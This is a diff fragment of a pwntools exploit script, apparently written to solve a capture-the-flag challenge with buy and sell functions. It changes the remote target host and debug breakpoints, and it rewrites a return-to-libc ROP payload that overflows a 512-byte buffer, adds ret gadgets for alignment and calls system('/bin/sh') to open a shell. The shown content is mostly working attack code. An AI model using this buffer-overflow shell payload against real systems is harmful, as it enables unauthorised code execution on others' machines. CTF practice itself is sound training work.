@@ -9,29 +9,29 @@ pwn.context.terminal = ["foot"]
 # p = pwn.process(exe.path)
 # pwn.gdb.attach(p,gdbscript='''
 #
-#               de connect angr
-#               b*main
-#               # c
-#               # b*buy
-#               # b*sell+245
-#               # b*sell+367
-#               # b*0x55555555569f
-#               b*sell+385
-#                ''')
-# p = pwn.gdb.debug([exe.path],"""
-#               de connect angr
-#               b*main
-#               # c
-#               # b*buy
-#               # b*sell+245
-#               # b*sell+367
-#               # b*0x55555555569f
-#               b*sell+385
-#
-#                 """)
+#           de connect angr
+#           b*main
+#           # c
+#           # b*buy
+#           # b*sell+245
+#           # b*sell+367
+#           # b*0x55555555569f
+#           b*sell+385
+#            ''')
 if pwn.args.REMOTE:
-    p = pwn.remote("103.163.24.78", 10001)
+    p = pwn.remote("0.tcp.ap.ngrok.io", 17568)
+else:
+    p = pwn.gdb.debug([exe.path],"""
+    # angr
+              # b*main
+              # c
+              # b*buy
+              # b*sell+245
+              # b*sell+367
+              # b*0x55555555569f
+              # b*sell+385
 
+                """)
 sla = lambda msg, data: p.sendlineafter(msg, data)
 sa = lambda msg, data: p.sendafter(msg, data)
 sl = lambda data: p.sendline(data)
@@ -74,9 +74,8 @@ if __name__ == "__main__":
     pwn.log.info(f"bin_sh_libc: {hex(bin_sh_libc)}")
     pwn.log.info(f"leaking libc: {hex(leak_libc)}")
     pwn.log.info(f"base libc: {hex(base_libc)}")
-    sl(b"a"*512 + pwn.p64(fake_rbp) + pwn.p64(pop_rdi)+pwn.p64(bin_sh_libc)+pwn.p64(libc_system))
-
-
+    input()
+    sl(b"a"*512 + pwn.p64(fake_rbp) +pwn.p64(ret)*2+ pwn.p64(pop_rdi)+pwn.p64(bin_sh_libc)+pwn.p64(libc_system))
 
 
 
